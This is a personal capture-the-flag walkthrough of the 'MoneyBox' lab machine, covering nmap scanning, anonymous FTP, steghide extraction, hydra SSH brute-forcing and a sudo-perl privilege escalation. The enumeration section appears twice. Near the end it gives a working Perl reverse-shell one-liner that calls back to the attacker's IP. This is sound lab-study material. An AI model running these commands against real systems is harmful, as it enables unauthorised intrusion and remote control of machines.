June 12th, 2023
  

#Enumerate

Given target: 192.168.169.230

  

##Nmap

sudo nmap --open -sV -sC -p- -sT 192.168.169.230 -oN 192-168-169-230.scan

Output

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 15:28 GMT              

Nmap scan report for 192.168.169.230                                         

Host is up (0.071s latency).

Not shown: 64136 closed tcp ports (conn-refused), 1396 filtered tcp ports (no-response)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg

| ftp-syst: 

|   STAT: 

| FTP server status:

|      Connected to ::ffff:192.168.45.201

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      At session startup, client count was 4

|      vsFTPd 3.0.3 - secure, fast, stable

|_End of status

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 

|   2048 1e30ce7281e0a23d5c28888b12acfaac (RSA)

|   256 019dfafbf20637c012fc018b248f53ae (ECDSA)

|_  256 2f34b3d074b47f8d17d237b12e32f7eb (ED25519)

80/tcp open  http    Apache httpd 2.4.38 ((Debian))

|_http-title: MoneyBox

|_http-server-header: Apache/2.4.38 (Debian)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

  

#Vulnerability Check

##FTP

Anon allowed and image contents are of 

ftp 192.168.169.230 21                                          15:28:37

Connected to 192.168.169.230.

220 (vsFTPd 3.0.3)

Name (192.168.169.230:kali): anonymous

331 Please specify the password.

Password: 

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering Extended Passive Mode (|||10274|)

150 Here comes the directory listing.

-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg

226 Directory send OK.

ftp> get trytofind.jpg

local: trytofind.jpg remote: trytofind.jpg

229 Entering Extended Passive Mode (|||46815|)

150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).

100% |********************************|  1068 KiB    1.46 MiB/s    00:00 ETA

226 Transfer complete.

1093656 bytes received in 00:00 (1.33 MiB/s)

ftp> exit

221 Goodbye.

 kali  🏡  OSCP  Moneybox                                                

 →  ls                                                              15:33:02

192-168-169-230.scan  trytofind.jpg

 kali  🏡  OSCP  Moneybox                                                

 →  file trytofind.jpg                                              15:33:04

trytofind.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 3984x2988, components 3

 kali  🏡  OSCP  Moneybox                                                

 →  gwenview trytofind.jpg

Image: [https://i.imgur.com/nR5L7Gv.png](https://i.imgur.com/nR5L7Gv.png)

  

##SSH

meh

  

##http

###Apache httpd 2.4.38

searchsploit Apache 2.4

Output

------------------------------------------- ---------------------------------

 Exploit Title                             |  Path

------------------------------------------- ---------------------------------

Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin  | php/remote/29290.c

Apache + PHP < 5.3.12 / < 5.4.2 - Remote C | php/remote/29316.py

Apache 2.2.4 - 413 Error HTTP Request Meth | unix/remote/30835.sh

Apache 2.4.17 - Denial of Service          | windows/dos/39037.php

Apache 2.4.17 < 2.4.38 - 'apache2ctl grace | linux/local/46676.php

Apache 2.4.23 mod_http2 - Denial of Servic | linux/dos/40909.py

Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal() | php/remote/40142.php

Apache 2.4.7 mod_status - Scoreboard Handl | linux/dos/34133.txt

Apache 2.4.x - Buffer Overflow             | multiple/webapps/51193.py

Apache < 2.2.34 / < 2.4.27 - OPTIONS Memor | linux/webapps/42745.py

Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial o | multiple/dos/26710.txt

Apache HTTP Server 2.4.49 - Path Traversal | multiple/webapps/50383.sh

Apache HTTP Server 2.4.50 - Path Traversal | multiple/webapps/50406.sh

Apache HTTP Server 2.4.50 - Remote Code Ex | multiple/webapps/50446.sh

Apache HTTP Server 2.4.50 - Remote Code Ex | multiple/webapps/50512.py

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/21671.c

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/47080.c

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/764.c

Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' | linux/webapps/39642.txt

Apache Shiro 1.2.4 - Cookie RememberME Des | multiple/remote/48410.rb

Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' | multiple/remote/21492.txt

Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' I | multiple/remote/21490.txt

Apache Tomcat 3.2.3/3.2.4 - Example Files  | multiple/remote/21491.txt

Apache Tomcat < 5.5.17 - Remote Directory  | multiple/remote/2061.txt

Apache Tomcat < 6.0.18 - 'utf8' Directory  | multiple/remote/6229.txt

Apache Tomcat < 6.0.18 - 'utf8' Directory  | unix/remote/14489.c

Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 /  | jsp/webapps/42966.py

Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 /  | windows/webapps/42953.txt

Apache Xerces-C XML Parser < 3.1.2 - Denia | linux/dos/36906.txt

Webfroot Shoutbox < 2.32 (Apache) - Local  | linux/remote/34.pl

------------------------------------------- ---------------------------------

Shellcodes: No Results

------------------------------------------- ---------------------------------

 Paper Title                               |  Path

------------------------------------------- ---------------------------------

Apache HTTP Server 2.4.50 Path Traversal a | docs/english/50552-apache-http-s

------------------------------------------- ---------------------------------

###Directories

gobuster dir -u http://192.168.169.230:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Output

===============================================================

Gobuster v3.5

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:                     http://192.168.169.230:80

[+] Method:                  GET

[+] Threads:                 10

[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[+] Negative Status codes:   404

[+] User Agent:              gobuster/3.5

[+] Timeout:                 10s

===============================================================

2023/06/12 15:39:36 Starting gobuster in directory enumeration mode

===============================================================

/blogs                (Status: 301) [Size: 318] [--> http://192.168.169.230/blogs/]                                                                       

/server-status        (Status: 403) [Size: 280]

  

####http://192.168.169.230/blogs/

<html>

<head><title>MoneyBox</title></head>

<body>

    <h1>I'm T0m-H4ck3r</h1><br>

        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>

        <p>If You Want Hint For Next Step......?<p>

</body>

</html>

  

  

<!--the hint is the another secret directory is S3cr3t-T3xt-->

  

####http://192.168.169.230/S3cr3t-T3xt/

<html>

<head><title>MoneyBox</title></head>

<body>

    <h1>There is Nothing In this Page.........</h1>

</body>

</html>

  

<!..Secret Key 3xtr4ctd4t4 >

Maybe SSH or steg since I got an image before.

Password looks like 1337 speak for "Extracted" so I'll try the password on ssh then go for steg

  

#Exploit

##SSH

####Retrieved Password Attempt

ssh moneybox@192.168.169.230 

3xtr4ctd4t4 

NOPE. Also with cap M is also not working

##Steg

3xtr4ctd4t4

Find top steg tools. Start at #1 and go down until it works...

1. Steghide

2. Stegoshare

3. Wavsteg

4. Snow

5. Steganoroute

  
  

#Privilege Escalation

Switching to markdown format due to all the MD to OSCP report tools that exist

  

#Enumerate

Given target: 192.168.169.230

  

##Nmap

sudo nmap --open -sV -sC -p- -sT 192.168.169.230 -oN 192-168-169-230.scan

Output

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 15:28 GMT              

Nmap scan report for 192.168.169.230                                         

Host is up (0.071s latency).

Not shown: 64136 closed tcp ports (conn-refused), 1396 filtered tcp ports (no-response)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg

| ftp-syst: 

|   STAT: 

| FTP server status:

|      Connected to ::ffff:192.168.45.201

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      At session startup, client count was 4

|      vsFTPd 3.0.3 - secure, fast, stable

|_End of status

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 

|   2048 1e30ce7281e0a23d5c28888b12acfaac (RSA)

|   256 019dfafbf20637c012fc018b248f53ae (ECDSA)

|_  256 2f34b3d074b47f8d17d237b12e32f7eb (ED25519)

80/tcp open  http    Apache httpd 2.4.38 ((Debian))

|_http-title: MoneyBox

|_http-server-header: Apache/2.4.38 (Debian)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

  

#Vulnerability Check

##FTP

Anon allowed and image contents are of 

ftp 192.168.169.230 21                                          15:28:37

Connected to 192.168.169.230.

220 (vsFTPd 3.0.3)

Name (192.168.169.230:kali): anonymous

331 Please specify the password.

Password: 

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering Extended Passive Mode (|||10274|)

150 Here comes the directory listing.

-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg

226 Directory send OK.

ftp> get trytofind.jpg

local: trytofind.jpg remote: trytofind.jpg

229 Entering Extended Passive Mode (|||46815|)

150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).

100% |********************************|  1068 KiB    1.46 MiB/s    00:00 ETA

226 Transfer complete.

1093656 bytes received in 00:00 (1.33 MiB/s)

ftp> exit

221 Goodbye.

 kali  🏡  OSCP  Moneybox                                                

 →  ls                                                              15:33:02

192-168-169-230.scan  trytofind.jpg

 kali  🏡  OSCP  Moneybox                                                

 →  file trytofind.jpg                                              15:33:04

trytofind.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 3984x2988, components 3

 kali  🏡  OSCP  Moneybox                                                

 →  gwenview trytofind.jpg

Image: [https://i.imgur.com/nR5L7Gv.png](https://i.imgur.com/nR5L7Gv.png)

  

##SSH

meh

  

##http

###Apache httpd 2.4.38

searchsploit Apache 2.4

Output

------------------------------------------- ---------------------------------

 Exploit Title                             |  Path

------------------------------------------- ---------------------------------

Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin  | php/remote/29290.c

Apache + PHP < 5.3.12 / < 5.4.2 - Remote C | php/remote/29316.py

Apache 2.2.4 - 413 Error HTTP Request Meth | unix/remote/30835.sh

Apache 2.4.17 - Denial of Service          | windows/dos/39037.php

Apache 2.4.17 < 2.4.38 - 'apache2ctl grace | linux/local/46676.php

Apache 2.4.23 mod_http2 - Denial of Servic | linux/dos/40909.py

Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal() | php/remote/40142.php

Apache 2.4.7 mod_status - Scoreboard Handl | linux/dos/34133.txt

Apache 2.4.x - Buffer Overflow             | multiple/webapps/51193.py

Apache < 2.2.34 / < 2.4.27 - OPTIONS Memor | linux/webapps/42745.py

Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial o | multiple/dos/26710.txt

Apache HTTP Server 2.4.49 - Path Traversal | multiple/webapps/50383.sh

Apache HTTP Server 2.4.50 - Path Traversal | multiple/webapps/50406.sh

Apache HTTP Server 2.4.50 - Remote Code Ex | multiple/webapps/50446.sh

Apache HTTP Server 2.4.50 - Remote Code Ex | multiple/webapps/50512.py

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/21671.c

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/47080.c

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/764.c

Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' | linux/webapps/39642.txt

Apache Shiro 1.2.4 - Cookie RememberME Des | multiple/remote/48410.rb

Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' | multiple/remote/21492.txt

Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' I | multiple/remote/21490.txt

Apache Tomcat 3.2.3/3.2.4 - Example Files  | multiple/remote/21491.txt

Apache Tomcat < 5.5.17 - Remote Directory  | multiple/remote/2061.txt

Apache Tomcat < 6.0.18 - 'utf8' Directory  | multiple/remote/6229.txt

Apache Tomcat < 6.0.18 - 'utf8' Directory  | unix/remote/14489.c

Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 /  | jsp/webapps/42966.py

Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 /  | windows/webapps/42953.txt

Apache Xerces-C XML Parser < 3.1.2 - Denia | linux/dos/36906.txt

Webfroot Shoutbox < 2.32 (Apache) - Local  | linux/remote/34.pl

------------------------------------------- ---------------------------------

Shellcodes: No Results

------------------------------------------- ---------------------------------

 Paper Title                               |  Path

------------------------------------------- ---------------------------------

Apache HTTP Server 2.4.50 Path Traversal a | docs/english/50552-apache-http-s

------------------------------------------- ---------------------------------

###Directories

gobuster dir -u http://192.168.169.230:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Output

===============================================================

Gobuster v3.5

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:                     http://192.168.169.230:80

[+] Method:                  GET

[+] Threads:                 10

[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[+] Negative Status codes:   404

[+] User Agent:              gobuster/3.5

[+] Timeout:                 10s

===============================================================

2023/06/12 15:39:36 Starting gobuster in directory enumeration mode

===============================================================

/blogs                (Status: 301) [Size: 318] [--> http://192.168.169.230/blogs/]                                                                       

/server-status        (Status: 403) [Size: 280]

  

####http://192.168.169.230/blogs/

<html>

<head><title>MoneyBox</title></head>

<body>

    <h1>I'm T0m-H4ck3r</h1><br>

        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>

        <p>If You Want Hint For Next Step......?<p>

</body>

</html>

  

  

<!--the hint is the another secret directory is S3cr3t-T3xt-->

  

####http://192.168.169.230/S3cr3t-T3xt/

<html>

<head><title>MoneyBox</title></head>

<body>

    <h1>There is Nothing In this Page.........</h1>

</body>

</html>

  

<!..Secret Key 3xtr4ctd4t4 >

Maybe SSH or steg since I got an image before.

Password looks like 1337 speak for "Extracted" so I'll try the steg then try bruteforce on ssh since I still need a username

  

#Exploit

##Steg

3xtr4ctd4t4

Find top steg tools. Start at #1 and go down until it works...

###1. Steghide

steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4               16:06:13

  

wrote extracted data to "data.txt".

 kali  🏡  OSCP  Moneybox                                                

 →  cat data.txt                                                    16:06:14

Hello.....  renu

  

      I tell you something Important.Your Password is too Week So Change Your Password

Don't Underestimate it.......

  

Skip the rest and now I bruteforce ssh with user renu

2. Stegoshare

3. Wavsteg

4. Snow

5. Steganoroute

  

##SSH 

###Bruteforce

hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.169.230

  

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

  

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-12 16:10:14

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task

[DATA] attacking ssh://192.168.169.230:22/

[22][ssh] host: 192.168.169.230   login: renu   password: 987654321

Now to test the password as Hydra is known to hallucinate 

  
ssh renu@192.168.169.230                                        16:11:14

renu@192.168.169.230's password: 

Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

  

The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

  

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Fri Sep 23 10:00:13 2022

renu@MoneyBox:~$ ls

ftp  local.txt

renu@MoneyBox:~$ cat local.txt 

6a1be9298138e1ff1514bcc04fd8737f

Now onto priv esc

  

#Privilege Escalation

##Sudo privlleges 

renu@MoneyBox:~$ sudo -l

[sudo] password for renu: 

Sorry, user renu may not run sudo on MoneyBox.

RIP

##File system exploring

Nothing in BashRC

User lily found

Binary privilege check

renu@MoneyBox:/$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd

-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount

-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp

-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn

-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh

-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount

-rwsr-xr-x 1 root root 34896 Apr 22  2020 /usr/bin/fusermount

-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su

-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd

-rwsr-xr-x 1 root root 157192 Jan 20  2021 /usr/bin/sudo

-rwsr-xr-- 1 root messagebus 51184 Oct 10  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device

-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign

Nothing promising

I can dump lily's keys though and switch to her user account

renu@MoneyBox:/home/lily$ cat .ssh/authorized_keys 

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian

renu@MoneyBox:/home/lily$ ssh lily@localhost

The authenticity of host 'localhost (::1)' can't be established.

ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.

Are you sure you want to continue connecting (yes/no)? yes

Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.

Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

  

The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

  

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80

lily@MoneyBox:~$

Now to check what she can run

lily@MoneyBox:~$ sudo -l

Matching Defaults entries for lily on MoneyBox:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  

User lily may run the following commands on MoneyBox:

    (ALL : ALL) NOPASSWD: /usr/bin/perl

So she can run perl as root. Escalate to root via perl syntax.

lily@MoneyBox:~$ perl -e 'exec "/bin/bash";'

lily@MoneyBox:~$ sudo !!

sudo exit

[sudo] password for lily: 

Sorry, try again.

Didn't work so I'll try a rev shell

  

Set up catch

nc -nlvp 4444

  

My IP

 →  ip route | grep tun                                                                                   16:27:41

192.168.45.0/24 dev tun0 proto kernel scope link src 192.168.45.201 

192.168.169.0/24 via 192.168.45.254 dev tun0 

  

Rev Shell Script:

perl -e 'use Socket;$i="192.168.45.201";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

  

Make sure to run it as sudo since lily can! 

 kali  🏡                                                                                                        

 →  nc -nlvp 4444                                                                                         16:32:23

listening on [any] 4444 ...

connect to [192.168.45.201] from (UNKNOWN) [192.168.169.230] 46150

# whoami

root

# ls

# cd

# ls

proof.txt

# cat proof     

cat: proof: No such file or directory

# cat proof.txt

80ba0c566d8598739895252de4e0f324

  

Boot2Root